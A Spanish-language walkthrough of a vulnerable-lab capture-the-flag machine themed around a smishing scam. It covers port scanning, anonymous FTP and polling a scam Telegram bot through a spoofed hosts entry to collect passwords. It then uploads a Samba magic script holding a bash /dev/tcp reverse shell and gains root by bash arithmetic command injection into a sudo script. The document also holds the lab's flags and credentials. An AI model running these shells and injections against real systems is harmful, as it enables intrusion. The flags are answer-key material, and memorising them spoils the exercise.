---
icon: flag
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
---

# CTF Smishing Intermediate

URL Download CTF = [https://mega.nz/file/aMETwSKY#bRd1poVd5L-rN9bHA25z-gYL2rpVz5ahjirrq6WAczU](https://mega.nz/file/aMETwSKY#bRd1poVd5L-rN9bHA25z-gYL2rpVz5ahjirrq6WAczU)

## Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip smishing.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_run.sh smishing.tar
```

Info:

```
██████╗ ██╗    ██╗███╗   ██╗██████╗ ██████╗ ██╗
██╔══██╗██║    ██║████╗  ██║╚════██╗██╔══██╗██║
██████╔╝██║ █╗ ██║██╔██╗ ██║ █████╔╝██║  ██║██║
██╔═══╝ ██║███╗██║██║╚██╗██║ ╚═══██╗██║  ██║╚═╝
██║     ╚███╔███╔╝██║ ╚████║██████╔╝██████╔╝██╗
╚═╝      ╚══╝╚══╝ ╚═╝  ╚═══╝╚═════╝ ╚═════╝ ╚═╝

          ==                           
         @+:@ @##@                     
          @++:-----+@ @@#+:----:+#     
           #-+-----:+:---------:       
            *::-----++-----::::#       
             ::------+:--------:       
             #-+------+:-::-----#@     
              *::+=@@#++-------::@     
              @+=     @++::+#@@@#*#    
               #-@                     
                *+#++@                 
               +-:::+-@                
               :-:+:::+                
              @+::*::::                
             *::++-::*                 
          =:--:-:++ @-#                
      #*:---:--++@   @@                
      @::-:--++*                       
       @::-:++#                        
         *++*                          

 :: Plataforma de máquinas vulnerables ::
 :: Desarrollado por Pwn3d! y Dockerlabs - creado por @d1se0 ::

 █▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
 █           FLAG{Pwn3d!_is_awesome!}            █
 █▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█


[✔] bc ya está instalado.

[✔] Docker ya está instalado
[!] Limpiando previos contenedores e imágenes
[✔] Cargando la máquina virtual      
[✔] Activando máquina virtual      

[✔] Máquina activa. Dirección IP: 172.17.0.2
[!] Presiona Ctrl+C para limpiar y salir
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-12 06:22 EDT
Nmap scan report for 172.17.0.3
Host is up (0.000028s latency).

PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.5
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 172.17.0.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 101      104           322 Sep 12 11:34 note.txt
80/tcp  open  http        Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Orange - Verificaci\xC3\xB3n de Seguridad
|_http-server-header: Apache/2.4.58 (Ubuntu)
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
MAC Address: 02:42:AC:11:00:03 (Unknown)
Service Info: OS: Unix

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-09-12T10:22:31
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.78 seconds
```

Veremos varias cosas interesantes, entre ellas el puerto `FTP` y el `80`, si entramos por el `FTP` de forma `anonima` ya que vemos que nos deja, veremos lo siguiente:

```shell
ftp anonymous@<IP>
```

Dejamos la contraseña en blanco y si listamos veremos esto:

```
229 Entering Extended Passive Mode (|||20638|)
150 Here comes the directory listing.
-rw-r--r--    1 101      104           322 Sep 12 11:34 note.txt
226 Directory send OK.
```

Nos vamos a descargar la `note.txt` para ver que pone.

```shell
get note.txt
```

> note.txt

```
Te dejo esta nota para que entres en la web, ya que me han estafado mediante un smishing y me gustaria tu ayuda, quiero que encuentres a esos responsable, quiero que intentes acceder a sus servidores y ver quien esta detras de todo esto, ayudame por favor, contacte contigo por que se que eres el mejor hacker del mundo!!
```

Veremos que no hay gran informacion simplemente alguien contrato unos servicios de un hacker, para poder ver la estafa que hay montada, si entramos en el puerto `80` veremos que hay una pagina web simulando que es `Orange` por lo que vemos es la pagina de los estafadores, como no vemos gran cosa, vamos a realizar un poco de `fuzzing`.

## Gobuster

```shell
gobuster dir -u http://<IP>/ -w <WORDLIST> -x html,php,txt,zip -t 50 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.3/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt,zip
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 275]
/.php                 (Status: 403) [Size: 275]
/index.html           (Status: 200) [Size: 43490]
/security             (Status: 200) [Size: 962]
/templates            (Status: 200) [Size: 1939]
/contacts             (Status: 200) [Size: 945]
/css                  (Status: 200) [Size: 929]
/js                   (Status: 200) [Size: 927]
/javascript           (Status: 403) [Size: 275]
/utils                (Status: 200) [Size: 1159]
/page.zip             (Status: 200) [Size: 53387028]
/.html                (Status: 403) [Size: 275]
/.php                 (Status: 403) [Size: 275]
/controllers          (Status: 200) [Size: 1846]
/server-status        (Status: 403) [Size: 275]
Progress: 1102800 / 1102805 (100.00%)
===============================================================
Finished
===============================================================
```

Veremos muchas cosas, pero entre ellas hay algo muy interesante llamado `page.zip`, vamos a ver que contiene.

```
wget http://<IP>/page.zip
```

Ahora si lo descomprimimos veremos la siguiente estructura de carpetas:

```
unzip page.zip
```

Info:

```
.
├── assents
├── contacts
│   └── contacts.txt
├── controllers
│   ├── CookieServelet.class
│   ├── CreditServelet.class
│   ├── LimitServelet.class
│   ├── PageServelet.class
│   └── UsersServelet.class
├── css
│   └── style.css
├── daos
│   ├── ConexionDDBBDAO.class
│   ├── CookieDAO.class
│   ├── CreditDAO.class
│   ├── LimitDAO.class
│   ├── PageDAO.class
│   └── UserDAO.class
├── index.html
├── js
│   └── script.js
├── page.zip
├── security
│   ├── apiTelegramBot.py
│   └── rateLimitPage.class
├── smishing
│   └── creditsCards.txt
├── templates
│   ├── admin.html
│   ├── cookies.html
│   ├── footer.html
│   ├── panel.html
│   ├── profile.html
│   └── run.html
└── utils
    ├── JWToken.class
    └── UsersCookie.class

11 directories, 27 files
```

Veremos que es la estructura de la pagina entera, pero vemos un archivo muy interesante llamado `apiTelegramBot.py` si vemos que hace por dentro, veremos lo siguiente:

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import json
import time
import logging
from datetime import datetime

# Configuración de logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("telegram_bot.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("TelegramBot")

# Configuración directa del bot
API_TOKEN_BOT = "123456789:AAE29fG7hT8KxZ3LmNOPqRstUvWxYzA1BCD"
CHAT_ID = "-41925391852"

class TelegramBot:
    def __init__(self, token):
        self.token = token
        self.base_url = f"http://api.telegram.org/bot{self.token}"
        self.last_update_id = 0
        
    def get_me(self):
        """Obtiene información sobre el bot"""
        url = f"{self.base_url}/getMe"
        try:
            response = requests.get(url)
            response.raise_for_status()
            return response.json()
        except requests.exceptions.RequestException as e:
            logger.error(f"Error al obtener información del bot: {e}")
            return None
    
    def get_updates(self, timeout=30, offset=None):
        """Obtiene actualizaciones (mensajes) del bot"""
        url = f"{self.base_url}/getUpdates"
        params = {'timeout': timeout}
        
        if offset:
            params['offset'] = offset
            
        try:
            response = requests.get(url, params=params)
            response.raise_for_status()
            return response.json()
        except requests.exceptions.RequestException as e:
            logger.error(f"Error al obtener actualizaciones: {e}")
            return None
    
    def send_message(self, chat_id, text, parse_mode=None, reply_to_message_id=None):
        """Envía un mensaje a un chat específico"""
        url = f"{self.base_url}/sendMessage"
        payload = {
            'chat_id': chat_id,
            'text': text
        }
        
        if parse_mode:
            payload['parse_mode'] = parse_mode
            
        if reply_to_message_id:
            payload['reply_to_message_id'] = reply_to_message_id
            
        try:
            response = requests.post(url, json=payload)
            response.raise_for_status()
            return response.json()
        except requests.exceptions.RequestException as e:
            logger.error(f"Error al enviar mensaje: {e}")
            return None
    
    def send_document(self, chat_id, document_path, caption=None):
        """Envía un documento a un chat específico"""
        url = f"{self.base_url}/sendDocument"
        
        with open(document_path, 'rb') as file:
            files = {'document': file}
            payload = {'chat_id': chat_id}
            
            if caption:
                payload['caption'] = caption
                
            try:
                response = requests.post(url, data=payload, files=files)
                response.raise_for_status()
                return response.json()
            except requests.exceptions.RequestException as e:
                logger.error(f"Error al enviar documento: {e}")
                return None
    
    def get_chat_members_count(self, chat_id):
        """Obtiene el número de miembros en un chat"""
        url = f"{self.base_url}/getChatMembersCount"
        params = {'chat_id': chat_id}
        
        try:
            response = requests.get(url, params=params)
            response.raise_for_status()
            return response.json()
        except requests.exceptions.RequestException as e:
            logger.error(f"Error al obtener número de miembros: {e}")
            return None
    
    def get_chat_info(self, chat_id):
        """Obtiene información sobre un chat"""
        url = f"{self.base_url}/getChat"
        params = {'chat_id': chat_id}
        
        try:
            response = requests.get(url, params=params)
            response.raise_for_status()
            return response.json()
        except requests.exceptions.RequestException as e:
            logger.error(f"Error al obtener información del chat: {e}")
            return None
    
    def process_updates(self):
        """Procesa las actualizaciones recibidas"""
        updates = self.get_updates(offset=self.last_update_id)
        
        if not updates or 'result' not in updates:
            return
        
        for update in updates['result']:
            update_id = update['update_id']
            
            # Actualizamos el último ID procesado
            if update_id > self.last_update_id:
                self.last_update_id = update_id + 1
            
            # Procesamos diferentes tipos de actualizaciones
            if 'message' in update:
                self.process_message(update['message'])
            elif 'edited_message' in update:
                self.process_edited_message(update['edited_message'])
            elif 'channel_post' in update:
                self.process_channel_post(update['channel_post'])
    
    def process_message(self, message):
        """Procesa un mensaje recibido"""
        chat_id = message['chat']['id']
        sender_name = message['from'].get('first_name', 'Usuario')
        text = message.get('text', '')
        
        logger.info(f"Mensaje recibido de {sender_name} en chat {chat_id}: {text}")
        
        # Comandos básicos
        if text.startswith('/'):
            command = text.split(' ')[0].lower()
            
            if command == '/start':
                self.send_message(chat_id, f"Hola {sender_name}! Soy un bot de ejemplo. ¿En qué puedo ayudarte?")
            elif command == '/help':
                self.send_message(chat_id, "Comandos disponibles:\n/start - Iniciar conversación\n/help - Mostrar ayuda\n/info - Información del chat\n/time - Hora actual")
            elif command == '/info':
                chat_info = self.get_chat_info(chat_id)
                if chat_info and 'result' in chat_info:
                    info_text = f"Información del chat:\nID: {chat_info['result']['id']}\nTipo: {chat_info['result']['type']}\nTítulo: {chat_info['result'].get('title', 'No disponible')}"
                    self.send_message(chat_id, info_text)
            elif command == '/time':
                current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                self.send_message(chat_id, f"Hora actual: {current_time}")
            else:
                self.send_message(chat_id, "Comando no reconocido. Use /help para ver los comandos disponibles.")
    
    def process_edited_message(self, message):
        """Procesa un mensaje editado"""
        logger.info(f"Mensaje editado en chat {message['chat']['id']}")
    
    def process_channel_post(self, post):
        """Procesa un post de canal"""
        logger.info(f"Post de canal en chat {post['chat']['id']}")
    
    def run(self, poll_interval=5):
        """Ejecuta el bot en modo polling"""
        logger.info("Iniciando bot de Telegram...")
        
        # Verificamos que el bot es válido
        bot_info = self.get_me()
        if not bot_info or not bot_info.get('ok'):
            logger.error("No se pudo verificar el bot. Revisa el token.")
            return
        
        logger.info(f"Bot iniciado: {bot_info['result']['first_name']} (@{bot_info['result']['username']})")
        
        # Bucle principal
        while True:
            try:
                self.process_updates()
                time.sleep(poll_interval)
            except KeyboardInterrupt:
                logger.info("Bot detenido por el usuario.")
                break
            except Exception as e:
                logger.error(f"Error en el bucle principal: {e}")
                time.sleep(poll_interval)

def main():
    # Crear instancia del bot con las variables predefinidas
    bot = TelegramBot(API_TOKEN_BOT)
    
    # Ejemplo de uso de las funciones
    print("=== INFORMACIÓN DEL BOT ===")
    bot_info = bot.get_me()
    if bot_info and bot_info.get('ok'):
        print(f"Bot: {bot_info['result']['first_name']} (@{bot_info['result']['username']})")
    else:
        print("Error: No se pudo obtener información del bot. Verifica el token.")
        return
    
    print("\n=== INFORMACIÓN DEL CHAT ===")
    chat_info = bot.get_chat_info(CHAT_ID)
    if chat_info and chat_info.get('ok'):
        print(f"Chat: {chat_info['result'].get('title', 'Sin título')} (ID: {chat_info['result']['id']})")
    else:
        print("Error: No se pudo obtener información del chat. Verifica el ID.")
    
    print("\n=== NÚMERO DE MIEMBROS ===")
    members_count = bot.get_chat_members_count(CHAT_ID)
    if members_count and members_count.get('ok'):
        print(f"Miembros en el chat: {members_count['result']}")
    
    print("\n=== ENVIANDO MENSAJE DE PRUEBA ===")
    message = bot.send_message(
        CHAT_ID, 
        f"🤖 Bot conectado correctamente!\nHora: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    )
    if message and message.get('ok'):
        print("Mensaje enviado correctamente!")
    else:
        print("Error al enviar mensaje.")
    
    print("\n=== INICIANDO MODO POLLING (Ctrl+C para detener) ===")
    # Iniciar el bot en modo polling (escucha de mensajes)
    bot.run()

if __name__ == "__main__":
    main()
```

Veremos que los estafadores tienen un `bot` de `Telegram` con el que todas las tarjetas de credito que se depositan en la pagina se las van enviando con dicho `bot` al grupo de `Telegram`, si vemos esta estableciendo la `API` del `Bot` y el `Chat ID` del grupo de `Telegram`, por lo que vamos añadir dicho dominio que pone `api.telegram.org` al archivo `hosts` para que podamos utilizar dicho `bot` para obtener los mensajes que se vayan enviando desde dicho grupo, a ver si descubrimos algo interesante:

## Conexión API Telegram Bot

```shell
nano /etc/hosts

#Dentro del nano
<IP>              api.telegram.org
```

Una vez que lo guardemos vamos a entrar por dicho dominio poniendo lo siguiente para realizar la conexion con el `bot` y ver si sigue funcionando.

```shell
curl 'http://api.telegram.org/bot123456789:AAE29fG7hT8KxZ3LmNOPqRstUvWxYzA1BCD/getUpdates?chat_id=-41925391852'
```

Info:

```
{"ok":true,"result":[]}
```

> NOTA: Si por lo que sea te da un `500 error` significa que hay que esperar un poco mas hasta que el servicio se levante del todo, para que funcione.

Vemos que no nos aparece nada asi interesante y es por que cuando se envie un mensaje aparecera durante un tiempo corto en dicho `chat update`, por lo que vamos a montarnos un script para ir refrescando cada 1 segundo e ir obteniendo cualquier chat que se hable.

> fetch\_telegram\_updates.py

```python
#!/usr/bin/env python3
import requests, json, time, os

# --- CONFIG descubierta en pagina.bak ---
TOKEN = "123456789:AAE29fG7hT8KxZ3LmNOPqRstUvWxYzA1BCD"
CHAT_ID = "-41925391852"
BASE_URL = f"http://api.telegram.org/bot{TOKEN}/getUpdates"

OUTFILE = "collected_updates.json"
POLL_INTERVAL = 1

def load_collected():
    if os.path.exists(OUTFILE):
        with open(OUTFILE, "r") as f:
            return json.load(f)
    return {"updates": []}

def save_collected(data):
    with open(OUTFILE, "w") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

def main():
    collected = load_collected()
    print(f"Polling {BASE_URL}?chat_id={CHAT_ID}")
    try:
        while True:
            try:
                r = requests.get(BASE_URL, params={"chat_id": CHAT_ID}, timeout=5)
                if r.status_code == 200:
                    payload = r.json()
                    if payload.get("ok"):
                        for up in payload.get("result", []):
                            msg_id = up["message"]["message_id"]
                            if not any(u["message_id"] == msg_id for u in collected["updates"]):
                                collected["updates"].append({
                                    "message_id": msg_id,
                                    "date": up["message"]["date"],
                                    "text": up["message"]["text"]
                                })
                                print("Nuevo mensaje guardado:", up["message"]["text"])
                                save_collected(collected)
                else:
                    print("Respuesta HTTP:", r.status_code)
            except Exception as e:
                print("Error en la petición:", e)
            time.sleep(POLL_INTERVAL)
    except KeyboardInterrupt:
        print("\nDetenido. Mensajes guardados en", OUTFILE)

if __name__ == "__main__":
    main()
```

Ahora lo ejecutaremos de esta forma:

```shell
python3 fetch_telegram_updates.py
```

Info:

```
Polling http://api.telegram.org/bot123456789:AAE29fG7hT8KxZ3LmNOPqRstUvWxYzA1BCD/getUpdates?chat_id=-41925391852
Nuevo mensaje guardado: Estaba revisando la web de estafas y me di cuenta de que nos hemos dejado un page.bak, quien ha sido?
Nuevo mensaje guardado: Tambien tenemos que cambiar la configuracion de nuestro SMB, que vi algo turbio...
Nuevo mensaje guardado: Por cierto Mark mi contraseña es SoyElMejorEstafadorDelMundoP@ssw0rd!-# cuando termines dimelo para cambiarla, acuerdate tambien del usuario neo jeje
Nuevo mensaje guardado: Venga chavales que hay que seguir estafando, a trabajarrr
Nuevo mensaje guardado: Por cierto Mark acuerdate de entrar por el nuevo dominio al login staff.login
Nuevo mensaje guardado: Hey tio, cuantas estafas llevamos ya?
Nuevo mensaje guardado: Pues tengo un numbers.txt con mas de 500.000 mil numeros para un smishing
Nuevo mensaje guardado: Recordatorio: mantenimiento el jueves.
Nuevo mensaje guardado: Reunión del equipo a las 10h.
Nuevo mensaje guardado: Bro me puedes pasar tu contraseña para meterme por el panel, es urgente!
^C
Detenido. Mensajes guardados en collected_updates.json
```

Despues de un rato esperando, veremos que ya se van repitiendo, por lo que suponemos que no hay mas mensajes interesantes, vamos a cerrarlo con `Ctrl+C` y si leemos los mensajes, veremos varias cosas interesantes.

```
Por cierto Mark mi contraseña es SoyElMejorEstafadorDelMundoP@ssw0rd!-# cuando termines dimelo para cambiarla, acuerdate tambien del usuario neo jeje

Por cierto Mark acuerdate de entrar por el nuevo dominio al login staff.login
```

Por lo que vemos esta diciendo que hay otro dominio llamado `staff.login` en el que tiene un `login` para ellos, vamos añadirlo a nuestro archivo `hosts` y entrar dentro de el.

```shell
nano /etc/hosts

#Dentro del nano
<IP>              api.telegram.org staff.login
```

Lo guardamos y entraremos a dicho dominio a ver si carga.

## Escalate user neopro (SMB)

```
URL = http://staff.login/
```

Info:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-09-12 124101.png" alt=""><figcaption></figcaption></figure>

Veremos que si hay un `login` por lo que vamos a probar las credenciales que hemos visto anteriormente a ver si sirven.

```
User: neo
Pass: SoyElMejorEstafadorDelMundoP@ssw0rd!-#
```

Metiendo dichas credenciales, veremos que si nos deja entrar, si nos vamos al apartado `Perfil` veremos una foto de la `torre eiffel` y despues una captura de una configuracion de `SMB`:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-09-12 131436.png" alt=""><figcaption></figcaption></figure>

Vemos que esta el usuario `neopro` como usuario `samba`, pero no tenemos ninguna contraseña, tambien vemos que esta un `magic script` llamado `neopro.sh` por lo que vamos a crear el archivo para tenerlo ya preparado.

> neopro.sh

```bash
#!/bin/bash

bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
```

Lo guardamos y vamos a probar a utilizar como contraseña para conectarnos al recurso compartido llamado `NeoProShare` la palabra `torre eiffel` ya que hay una foto de la misma y podria ser dicha contraseña.

```shell
smbclient //<IP>/NeoProShare -U neopro
```

Metemos como contraseña `torre eiffel`...

```
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Sep 12 04:49:50 2025
  ..                                  D        0  Fri Sep 12 04:49:50 2025

                82083148 blocks of size 1024. 0 blocks available
```

Veremos que estaremos dentro, acordemonos de que hay un `magic script`, no veremos ningun archivo llamado `neopro.sh`, por lo que podemos aprovechar esta vulnerabilidad ya que ahora si subimos un archivo llamado de la misma forma se va a ejecutar, por lo que vamos a ponernos a la escucha.

```shell
nc -lvnp <PORT>
```

Y ahora vamos a subirlo de esta forma para que se ejecute.

```shell
put neopro.sh
```

Ahora si volvemos a donde tenemos la escucha, veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.177.129] from (UNKNOWN) [172.17.0.3] 58864
bash: cannot set terminal process group (45): Inappropriate ioctl for device
bash: no job control in this shell
neopro@f0f84f7c54a9:/srv/smb$ whoami
whoami
neopro
```

Veremos que ha funcionado, por lo que vamos a sanitizar la `shell`.

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate user trinity

Si listamos un poco el sistema, veremos un archivo interesante en la siguiente ruta:

```shell
ls -la /var/www/staff.login/
```

Info:

```
total 40
drwxr-xr-x 4 www-data www-data 4096 Sep 12 10:57 .
drwxr-xr-x 1 root     root     4096 Sep 12 09:53 ..
drwxr-xr-x 3 www-data www-data 4096 Sep 12 09:59 assets
-rwxr-xr-x 1 www-data www-data  851 Sep 12 09:58 home.php
drwxr-xr-x 2 www-data www-data 4096 Sep 12 10:56 img
-rwxr-xr-x 1 www-data www-data 1064 Sep 12 09:58 index.php
-rwxr-xr-x 1 www-data www-data   79 Sep 12 09:58 logout.php
-rwxr-xr-x 1 www-data www-data 1077 Sep 12 09:58 profile.php
-rwxr-xr-x 1 www-data www-data 1282 Sep 12 10:57 users.php
```

Veremos un `users.php`, vamos a ver que contiene dentro.

```php
<?php
// Usuarios predefinidos (usuario => [password, nombre, bio, foto])
$users = [
    "neo" => [
        "password" => "SoyElMejorEstafadorDelMundoP@ssw0rd!-#",
        "name" => "Neo",
        "bio" => "Soy el elegido para hackear la realidad.",
        "photo" => "img/neo.png",
        "posts" => [
            ["img" => "img/local.jpg", "desc" => "Preparando el próximo ataque al mainframe."],
            ["img" => "img/smb.png", "desc" => "Configuracion de SMB, para que no se me olvide, que esta con el usuario neopro."]
        ]
    ],
    "trinity" => [
        "password" => "SuperP@ssw0rd!-#S3crt4ImpossibleD3D3c0d1f1c4r",
        "name" => "Trinity",
        "bio" => "Experta en infiltración digital y combate cibernético.",
        "photo" => "img/trinity.jpg",
        "posts" => [
            ["img" => "img/user2.jpg", "desc" => "Cifrado avanzado en proceso."],
            ["img" => "img/user1.jpg", "desc" => "Escaneo de vulnerabilidades activado."]
        ]
    ]
];

// Posts globales del foro
$forum_posts = [
    ["user" => "neo", "message" => "Acabo de infiltrarme en el sistema principal."],
    ["user" => "trinity", "message" => "VPN establecida, nadie nos rastreará."],
    ["user" => "neo", "message" => "Preparando ataque DDoS ético."]
];
?>
```

Veremos unas credenciales de un usuario llamado `trinity` si listamos los usuarios a nivel local veremos que tambien esta creado y existe, por lo que vamos a probar esa contraseña para dicho usuario a ver si fuera la misma.

```shell
su trinity
```

Metemos como contraseña `SuperP@ssw0rd!-#S3crt4ImpossibleD3D3c0d1f1c4r`...

```
trinity@f0f84f7c54a9:/var/www/staff.login$ whoami
trinity
```

Con esto veremos que estaremos dentro, por lo que leeremos la `flag` del usuario.

> user.txt

```
cbd5c6460dcda6db7c0b6120fe47de1f
```

## Escalate Privileges

Si listamos la `/home` del usuario `trinity` veremos el siguiente archivo llamado `secure.sh`.

```
-rwxr-xr-x 1 root root 722 Sep 12 12:10 secure.sh
```

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for trinity on f0f84f7c54a9:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User trinity may run the following commands on f0f84f7c54a9:
    (ALL : ALL) NOPASSWD: /home/trinity/secure.sh
```

Veremos que podemos ejecutar el archivo como el usuario `root`, por lo que vamos a ver que hace por dentro dicho archivo.

```bash
#!/bin/bash

# Inicio del script de verificación de número
echo -n "Checker de Seguridad "

# Solicitar al usuario que ingrese un número
echo "Por favor, introduzca un número para verificar:"

# Leer la entrada del usuario y almacenar en una variable
read -rp "Digite el número: " num

# Función para comprobar el número ingresado
echo -e "\n"
check_number() {
  local number=$1
  local correct_number=666

  # Verificación del número ingresado
  if [[ $number -eq $correct_number ]]; then
    echo -e "\n[+] Correcto"
  else
    echo -e "\n[!] Incorrecto"
  fi
}

# Llamada a la función para verificar el número
check_number "$num"

# Mensaje de fin de script
echo -e "\n La verificación ha sido completada."
```

Veremos que esta validando si metemos bien un numero o no, pero vemos una vulnerabilidad bastante interesante, y es en la comparacion `logica` de los numero introducidos por el usuario y con el que lo compara, no vemos que este sanitizando la entrada a que sea solamente un numero, por lo que podremos meter lo que queramos, vamos a probar a utilizar una `inyeccion de comandos` a nivel de `bash` de esta forma:

```shell
sudo /home/trinity/secure.sh
```

Ahora cuando nos pida el numero, vamos a meter lo siguiente:

```shell
test[$(/bin/bash >&2)]+1
```

Info:

```
root@f0f84f7c54a9:/home/trinity# whoami
root
```

Y con esto veremos que ya seremos `root`, por lo que vamos a leer la `flag` del usuario `root`.

> root.txt

```
049b737e4dcd097cb2ce0b54cef950e9
```
